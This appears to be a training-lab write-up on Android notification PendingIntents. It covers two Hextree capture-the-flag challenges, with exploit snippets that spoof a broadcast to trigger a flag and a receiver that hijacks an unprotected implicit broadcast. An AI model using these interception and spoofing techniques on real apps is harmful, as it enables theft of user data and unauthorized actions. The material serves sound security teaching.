---
title: "Notification"
---

## Overview

Android apps create notifications using `NotificationCompat.Builder`, supplying an icon, title, text, etc., and optionally adding actions (buttons) with associated `PendingIntents`. Each action’s PendingIntent typically wraps an `Intent` targeting a `BroadcastReceiver` (or service/activity) in your app. For example, an alarm app might add a “Snooze” action button whose PendingIntent is a broadcast to an internal receiver that snoozes the alarm without opening the UI. (It's used receivers because there's no need to open the app for that)

Example 1: Set the notification's tap action

```java
Intent intent = new Intent(this, AlertDetails.class);
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
        .setSmallIcon(R.drawable.notification_icon)
        .setContentTitle("My notification")
        .setContentText("Hello World!")
        .setPriority(NotificationCompat.PRIORITY_DEFAULT)
        // Set the intent that fires when the user taps the notification.
        .setContentIntent(pendingIntent)
        .setAutoCancel(true);
```

Example 2: Add action buttons

```java
String ACTION_SNOOZE = "snooze"

Intent snoozeIntent = new Intent(this, MyBroadcastReceiver.class);
snoozeIntent.setAction(ACTION_SNOOZE);
snoozeIntent.putExtra(EXTRA_NOTIFICATION_ID, 0);
PendingIntent snoozePendingIntent =
        PendingIntent.getBroadcast(this, 0, snoozeIntent, 0);

NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
        .setSmallIcon(R.drawable.notification_icon)
        .setContentTitle("My notification")
        .setContentText("Hello World!")
        .setPriority(NotificationCompat.PRIORITY_DEFAULT)
        .setContentIntent(pendingIntent)
        .addAction(R.drawable.ic_snooze, getString(R.string.snooze),
                snoozePendingIntent);
```

## Vulnerabilities

### Unprotected component

Let's say that the app `io.hextree.attacksurface` has the following Activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag20Activity"
    android:exported="false"/>
```

```java
public class Flag20Activity extends AppCompactActivity {
    public static String GET_FLAG = "io.hextree.broadcast.GET_FLAG";

    public Flag20Activity() {...}

    private void createNotificationChannel() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        createNotificationChannel();
        super.onCreate(bundle);
        Intent intent = getIntent();
        if (intent == null) {
            return;
        }
        String action = intent.getAction();
        if (action != null && action.equals(GET_FLAG)) {
            success(this);
            return;
        }
        Flag20Receiver flag20Receiver = new Flag20Receiver();
        IntentFilter intentFilter = new IntentFilter(GET_FLAG);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(flag20Receiver, intentFilter, 2);
        } else {
            registerReceiver(flag20Receiver, intentFilter);
        }
        NotificationCompat.Builder builderAddAction = new NotificationCompat.Builder(this, "CHANNEL_ID").setSmallIcon(R.drawable.hextree_logo).setContentTitle(this.name).setContentText("Reverse engineer classes Flag20Activity and Flag20Receiver").setPriority(0).setAutoCancel(true).addAction(R.drawable.hextree_logo, "Get Flag", PendingIntent.getBroadcast(this, 0, new Intent(GET_FLAG), 201326592));
        if (ActivityCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") != 0) {
            if (Build.VERSION.SDK_INT >= 33) {
                ActivityCompat.requestPermissions(this, new String[]{"android.permission.POST_NOTIFICATIONS"}, 1);
            }
        } else {
            NotificationManagerCompat.from(this).notify(1, builderAddAction.build());
            Toast.makeText(this, "Check your notifications", 0).show();
        }
    }
}
```

```java
public class Flag20Receiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("Flag20Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (intent.getBooleanExtra("give-flag", false)) {
            success(context);
        } else {
            Toast.makeText(context, "Conditions not correct for flag", 0).show();
        }
    }

    private void success(Context context) {...}
}
```

To get the flag:

1. Launch the `Flag20Activity`. This step is required to dynamically register `Flag20Receiver` and display the notification. Since the Activity is not exported, this must be done from within the app.
2. Wait for the notification. The notification contains an action that sends a broadcast with the correct action (`GET_FLAG`).
3. Send a crafted broadcast.

```java
Intent intent = new Intent();
intent.setAction("io.hextree.broadcast.GET_FLAG");
intent.putExtra("give-flag", true);
sendBroadcast(intent);
```

### Hijacking

Let's say that the app `io.hextree.attacksurface` has the following Activity:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag21Activity"
    android:exported="false"/>
```

```java
public class Flag21Activity extends AppCompactActivity {
    public static String GIVE_FLAG = "io.hextree.broadcast.GIVE_FLAG";

    public Flag21Activity() {...}

    private void createNotificationChannel() {...}

    @Override
    protected void onCreate(Bundle bundle) {
        createNotificationChannel();
        super.onCreate(bundle);
        if (getIntent() == null) {
            return;
        }
        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String resultData = getResultData();
                Bundle resultExtras = getResultExtras(false);
                int resultCode = getResultCode();
                Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
                Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
                Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);
                Toast.makeText(context, "Check the broadcast intent for the flag", 0).show();
                Flag21Activity flag21Activity = Flag21Activity.this;
                flag21Activity.success(null, flag21Activity);
            }
        };
        this.f.addTag(GIVE_FLAG);
        IntentFilter intentFilter = new IntentFilter(GIVE_FLAG);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(broadcastReceiver, intentFilter, 2);
        } else {
            registerReceiver(broadcastReceiver, intentFilter);
        }
        Intent intent = new Intent(GIVE_FLAG);
        intent.putExtra("flag", this.f.appendLog(this.flag));
        NotificationCompat.Builder builderAddAction = new NotificationCompat.Builder(this, "CHANNEL_ID").setSmallIcon(R.drawable.hextree_logo).setContentTitle(this.name).setContentText("Reverse engineer classes Flag21Activity").setPriority(0).setAutoCancel(true).addAction(R.drawable.hextree_logo, "Give Flag", PendingIntent.getBroadcast(this, 0, intent, 201326592));
        if (ActivityCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") != 0) {
            if (Build.VERSION.SDK_INT >= 33) {
                ActivityCompat.requestPermissions(this, new String[]{"android.permission.POST_NOTIFICATIONS"}, 1);
            }
        } else {
            NotificationManagerCompat.from(this).notify(1, builderAddAction.build());
            Toast.makeText(this, "Check your notifications", 0).show();
        }
    }
}
```

**Critical detail**:

```
IntentFilter intentFilter = new IntentFilter(GIVE_FLAG);
if (Build.VERSION.SDK_INT >= 33) {
    registerReceiver(broadcastReceiver, intentFilter, 2);
} else {
    registerReceiver(broadcastReceiver, intentFilter);
}
```

`2 == Context.RECEIVER_EXPORTED`

This means:

* The receiver accepts broadcasts from other apps
* There is no permission requirement
* The broadcast is unprotected

> **Note**: On Android 13 (API 33) and above, `registerReceiver()` requires explicitly declaring whether a dynamically registered broadcast receiver is exported when listening to unprotected broadcasts. This is done by supplying one of the following flags: `Context.RECEIVER_EXPORTED`, `Context.RECEIVER_NOT_EXPORTED`.

Because the broadcast is implicit and has no permission protection any app can register a receiver for `io.hextree.broadcast.GIVE_FLAG` and intercept the flag.

```java
BroadcastReceiver hijackReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        String flag = intent.getStringExtra("flag");
        if (flag != null) {
            Log.d("flag", flag);
        }
    }
};

if (Build.VERSION.SDK_INT >= 33) {
    registerReceiver(
        hijackReceiver,
        new IntentFilter("io.hextree.broadcast.GIVE_FLAG"),
        Context.RECEIVER_EXPORTED
    );
} else {
    registerReceiver(
        hijackReceiver,
        new IntentFilter("io.hextree.broadcast.GIVE_FLAG")
    );
}
```